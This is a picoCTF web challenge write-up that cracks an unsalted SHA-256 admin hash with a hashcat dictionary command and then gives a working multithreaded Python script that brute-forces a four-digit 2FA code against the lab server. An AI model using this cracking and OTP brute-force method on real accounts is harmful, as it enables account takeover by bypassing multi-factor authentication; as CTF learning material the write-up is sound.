+++
date = '2026-04-09'
draft = false
title = 'Pico No FA writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

Seems like some data has been leaked! Can you get the flag?

---

We're given a website, its source and a db leak. 

## Identifying the vulnerabilities

The hashes aren't salted at all, and just a sha256, so we can quickly crack the admin's password with hashcat: `hashcat -a 0 -m 1400 hashadmin.txt /usr/share/wordlists/rockyou.txt` (`-a 0` means dictionary attack, and `-m 1400` means sha256).

![challenge-screenshot](hash.png#center)

Then, looking at the source, for the admin user there is also a 'MFA' code, which has a 120 second duration, and is a random number from 1000 to 9999. I tried just sending the requests one by one, but it was taking forever, so I tried threads with ThreadPoolExecutor. This was my script:

```python
#two_fa
import requests
from utils.pretty_print import pretty_print
from concurrent.futures import ThreadPoolExecutor
url = "http://foggy-cliff.picoctf.net:60553/"
url_login = url + "login"
url_2fa = url + "two_fa"

data = {
   "username":"admin",
   "password":"apple@123"
   }
  
sesh = requests.Session()
res = sesh.post(url_login, data=data)
pretty_print(res)
print(sesh.cookies.get_dict())

def otp(i):
    data = {
       "otp":i,
       "action":''
       }
    res = sesh.post(url_2fa, data=data)
    if 'Invalid' not in res.text:
        pretty_print(res)
        print(sesh.cookies.get_dict())
    print(i)
    

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(otp, range(1000,10000))
```

It was going fast enough, and it seemed to be getting the correct code every time, but it was just printing the normal login screen. I ran it a couple times for debugging, trying to get the cookies to check it out myself in burp (hence the printing), but the seventh time it just printed the flag page inexplicably. Anyways, here is the flag!

![challenge-screenshot](flag.png#center)
       


